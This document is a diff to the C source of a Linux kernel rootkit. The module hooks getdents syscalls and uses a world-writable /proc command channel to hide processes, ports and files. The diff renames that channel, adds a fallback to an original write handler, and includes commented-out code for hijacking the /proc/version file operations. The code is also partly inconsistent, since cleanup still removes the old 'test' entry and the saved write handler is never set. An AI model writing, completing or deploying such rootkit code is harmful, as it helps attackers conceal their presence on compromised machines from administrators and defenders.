@@ -357,7 +357,7 @@ static struct hide_pids* exist_hide_pids(char *target) {
     return NULL;
 }
 
-static void execute(char *cmd, int idx) {
+static unsigned int execute(char *cmd, int idx) {
     unsigned short port;
     struct hide_ports *new_port, *target;
     struct hide_files *new_file, *target_file;
@@ -376,7 +376,7 @@ static void execute(char *cmd, int idx) {
             }
         } else {
             printk(KERN_DEBUG "wrong cmd: %s, wrong port: %s\n", cmd, (char *)str + idx);
-            return;
+            return false;
         }
     } else if (strcmp(cmd, "unhide_port") == 0) {
         if (kstrtou16((char *) str + idx, 10, &port) == 0) {
@@ -386,7 +386,7 @@ static void execute(char *cmd, int idx) {
                 list_del(&target->list);
         } else {
             printk(KERN_DEBUG "wrong cmd: %s, wrong port: %s\n", cmd, (char *)str + idx);
-            return;
+            return false;
         }
     } else if (strcmp(cmd, "hide_file") == 0) {
         for (i = idx; i < strlen(str); i++) 
@@ -426,10 +426,15 @@ static void execute(char *cmd, int idx) {
         }
     } else {
         printk(KERN_INFO "unsupported behaviour: %s\n", str);
+        return false;
     }
+    return true;
 }
 
 /*---------------read and write on proc start-----------------*/
+static ssize_t (*orig_read) (struct file *, const char __user *, size_t, loff_t *);
+static ssize_t (*orig_write) (struct file *, const char __user *, size_t, loff_t *);
+
 static ssize_t write(struct file *file, const char __user *buffer, size_t count, loff_t *f_pos) {
     int i;
     char *cmd;    
@@ -445,7 +450,9 @@ static ssize_t write(struct file *file, const char __user *buffer, size_t count,
     cmd = kzalloc(i + 1, GFP_KERNEL);
     strncpy(cmd, str, i);
     cmd[i] = '\0';
-    execute(cmd, i + 1);
+    if (!execute(cmd, i + 1)) {
+        return orig_write(file, buffer, count, f_pos);
+    }
 
     printk(KERN_INFO "write from user: %s\n", str);
     return count;
@@ -470,6 +477,40 @@ static const struct file_operations file_fops = {
 };
 /*---------------read and write on proc end----------------*/
 
+/*---------------setup_channel---------------------------*/
+// static struct rb_node *entry;
+
+// static int setup_channel(void) {
+//     static const struct file_operations proc_file_fops;
+//     static struct file_operations *proc_fops;
+
+//     struct proc_dir_entry *proc_entry = proc_create("tmp", 0444, NULL, &proc_file_fops);
+//     proc_entry = proc_entry->parent;
+//     printk(KERN_INFO "%s", proc_entry->name);
+//     // BUG_ON(memcmp(proc_entry->name, "/proc", 5) == 0);
+
+//     // find /proc/version
+//     entry = rb_first(&proc_entry->subdir);
+//     while (entry) {
+//         if (strcmp(rb_entry(entry, struct proc_dir_entry, subdir_node)->name, "version") == 0) {
+//             proc_fops = (struct file_operations *) rb_entry(entry, struct proc_dir_entry, subdir_node)->proc_fops;
+//             break;
+//         }
+//         entry = rb_next(entry);
+//     }
+
+//     if (proc_fops->write) {
+//         orig_write = proc_fops->write;
+//         proc_fops->write = &write;
+//     }
+
+//     if (!proc_fops->read && !proc_fops->write) {
+//         printk(KERN_INFO "/proc/version has no write nor read function\n");
+//         return -1;
+//     }
+//     return 0;
+// }
+
 static struct ftrace_hook hooks[] = {
     HOOK("__x64_sys_getdents64", hook_sys_getdents64, &orig_getdents64),
     HOOK("__x64_sys_getdents", hook_sys_getdents, &orig_getdents),
@@ -486,14 +527,16 @@ static int __init rootkit_init(void) {
     int err;
     struct proc_dir_entry *entry;
 
+    //setup_channel();
+    //printk(KERN_INFO "setup_channel successfully\n");
     // create channel under /proc
     str = kzalloc(100, GFP_KERNEL);
-    entry = proc_create("test", 0666, NULL, &file_fops);
+    entry = proc_create("channel", 0666, NULL, &file_fops);
     if (!entry) {
-        printk(KERN_INFO "test create error\n");
+        printk(KERN_INFO "channel create error\n");
         return -1;
     } else {
-        printk(KERN_INFO "test create successfully\n");
+        printk(KERN_INFO "channel create successfully\n");
     }
 
     //hook syscalls in kernel
@@ -508,8 +551,11 @@ static int __init rootkit_init(void) {
 }
 
 static void __exit rootkit_exit(void) {
+    static struct file_operations *proc_fops;
     fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
     remove_proc_entry("test", NULL);
+    // proc_fops = (struct file_operations *) rb_entry(entry, struct proc_dir_entry, subdir_node)->proc_fops;
+    // proc_fops->write = orig_write;
     printk(KERN_INFO "rootkit: Unloaded :-(\n");
 }
 
